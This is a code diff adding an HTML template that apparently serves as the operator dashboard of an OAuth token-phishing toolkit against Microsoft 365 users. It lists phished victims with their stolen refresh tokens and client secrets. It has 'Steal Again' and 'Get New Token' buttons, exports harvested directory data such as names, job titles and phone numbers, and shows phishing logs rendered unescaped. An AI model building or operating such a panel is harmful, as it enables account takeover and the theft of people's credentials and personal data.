@@ -1,0 +1,226 @@
+{% extends "layout.html" %} 
+{% block body %}
+<div class="main-panel scroll-wrappe">
+   <div class="content-wrapper ">
+      <div class="row">
+         <div class="col-sm-12 ">
+            <div class="home-tab">
+               <div class="d-sm-flex align-items-center justify-content-between border-bottom">
+                  <ul class="nav nav-tabs" role="tablist">
+                     <li class="nav-item">
+                        <a class="nav-link  active ps-0" href="#" onclick="getMoreVictims()">Phished Victims</a>
+                     </li>
+                     <li class="nav-item">
+                        <a class="nav-link"  href="#" onclick="getPhishedVictim()">More Victims</a>
+                     </li>
+                  </ul>
+                  <div class="btn-wrapper">
+                     <a href="{{url_for('victimsdownload', type='phished')}}" class="btn btn-outline-dark"><i class="icon-download"></i>Phished User</a>
+                     <a href="{{url_for('victimsdownload', type='more')}}" class="btn btn-outline-dark"><i class="icon-download"></i>More Victims</a>
+                   </div>
+               </div>
+               <div class="tab-content tab-content-basic">
+                  <div class="col-lg-12 grid-margin stretch-card" id="more" style="display: none;">
+                     <div class="card">
+                        <div class="card-body">
+                           <div class="d-sm-flex align-items-center justify-content-between"><h4>More Victims</h4>
+                              <div class="btn-wrapper">
+                                  <a href="{{url_for('officeDelete', type='victims')}}" class="btn btn-danger text-white me-0"><i class="menu-icon mdi mdi-delete"></i>Delete All</a>
+                                </div>
+                            </div>
+                           <div class="form-group">
+                              <input class="form-control mb-2 mr-sm-2" id="displaySearch" name="displayName" placeholder="Search" type="text" value="">
+                           </div>
+                           <div class="table-responsive table-wrapper-scroll-y my-custom-scrollbar" style="max-height: 600px;" >
+                              <table class="table table-striped mb-6">
+                                 <thead>
+                                    <tr>
+                                       <th>
+                                          Display Name
+                                       </th>
+                                       <th>
+                                          User Principle Name
+                                       </th>
+                                       <th>
+                                          Job Title
+                                       </th>
+                                       <th>
+                                          Mobile Phone
+                                       </th>
+                                       <th>
+                                          ID
+                                       </th>
+                                    </tr>
+                                 </thead>
+                                 <tbody id="myTable">
+                                    {% for victim in victims %}
+                                    <tr>
+                                       <td>
+                                          {{ victim.displayName }}
+                                       </td>
+                                       <td>
+                                          {{ victim.userPrincipalName }}
+                                       </td>
+                                       <td>
+                                          {{ victim.jobTitle }}
+                                       </td>
+                                       <td>
+                                          {{ victim.mobilePhone }}
+                                       </td>
+                                       <td>
+                                          {{ victim.id }}
+                                       </td>
+                                    </tr>
+                                    {% endfor %}
+                                 </tbody>
+                              </table>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="col-lg-12 grid-margin stretch-card" id="phished" >
+                     <div class="card">
+                        <div class="card-body">
+                           <h4 class="card-title">Phished Victims</h4>
+                           <div class="table-responsive table-wrapper-scroll-y my-custom-scrollbar auto-height" >
+                              <table class="table table-striped mb-0" >
+                                 <thead>
+                                    <tr>
+                                       <th>
+                                          Username
+                                       </th>
+                                       <th>
+                                          Steal Again
+                                       </th>
+                                       <th>
+                                          Get New Token
+                                       </th>
+                                       <th>
+                                          Delete Victim
+                                       </th>
+                                       <th>
+                                          Refresh Token
+                                       </th>
+                                       <th>
+                                          Client Id
+                                       </th>
+                                       <th>
+                                          Client Secret
+                                       </th>
+                                       <th>
+                                          Redirect Url
+                                       </th>
+                                       
+                                    </tr>
+                                 </thead>
+                                 <tbody id="myTable">
+                                    {% for victim in phishedUser %}
+                                    <tr>
+                                       <td>
+                                          {{ victim.username }}
+                                       </td>
+                                       <td>
+                                          <a href="{{ url_for('stealAgain', username=victim.username) }}" type="button" class="btn btn-primary btn-icon-text text-white">
+                                             <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-clockwise" viewBox="0 0 16 16">
+                                                <path fill-rule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2v1z"/>
+                                                <path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466z"/>
+                                             </svg>
+                                             Steal Again
+                                          </a>
+                                       </td>
+                                       <td>
+                                          <a href="{{ url_for('getNewAccessToken', username=victim.username) }}" target=_blank type="button" class="btn btn-success btn-icon-text text-white">
+                                            <i class="ti-key btn-icon-prepend"></i>
+                                             Get Token
+                                          </a>
+                                       </td>
+                                       <td>
+                                          <a href="{{ url_for('deleteVictim', username=victim.username) }}" type="button" class="btn btn-danger btn-icon-text text-white">
+                                            <i class="ti-trash btn-icon-prepend"></i>
+                                             Delete
+                                          </a>
+                                       </td>
+                                       <td>
+                                          <input class="form-control mb-2 mr-sm-2"  type="text" value="{{ victim.refreshtoken }}">
+                                       </td>
+                                       <td>
+                                          {{ victim.clientId }}
+                                       </td>
+                                       <td>
+                                          {{ victim.clientSecret }}
+                                       </td>
+                                       <td>
+                                          {{ victim.redirectUrl }}
+                                       </td>
+                                       
+                                    </tr>
+                                    {% endfor %}
+                                 </tbody>
+                              </table>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="col-lg-12" >
+                     <div class="row flex-grow">
+                       <div class="col-md-6 col-lg-12 grid-margin stretch-card">
+                         <div class="card  bg-dark">
+                           <div class="card-body" style="overflow: scroll;position: relative;">
+                             <h3 class="card-title text-success">Phishing Logs</h3>
+                             
+                             <div id="display_log" class="text-warning " style="max-height: 500px;">
+                              {% for log in phishlogs %}
+                                 {{ log.message | safe }}
+                              {% endfor %}
+                           </div>
+                             
+                                   
+                           </div>
+                         </div>
+                       </div>
+                       </div>
+                     </div>
+               </div>
+            </div>
+         </div>
+      </div>
+   </div>
+</div>
+</div>
+</div>
+</div>
+<script src="{{ url_for('static',filename='js/jquery.min.js') }}"></script>
+<script>
+   var addclass = 'active ps-0';
+   var $cols = $('.nav-link').click(function(e) {
+       $cols.removeClass(addclass);
+       $(this).addClass(addclass);
+   });
+   
+       $(document).ready(function(){
+         $("#displaySearch").on("keyup", function() {
+           var value = $(this).val().toLowerCase();
+           $("#myTable tr").filter(function() {
+             $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
+           });
+         });
+       });
+   
+       function getPhishedVictim(){
+           document.getElementById("phished").style.display = "none";
+           document.getElementById("more").style.display = "block";
+   
+       }
+   
+       function getMoreVictims(){
+           document.getElementById("phished").style.display = "block";
+           document.getElementById("more").style.display = "none";
+   
+       }
+
+
+
+</script>
+       
+</script>
+{% endblock %}
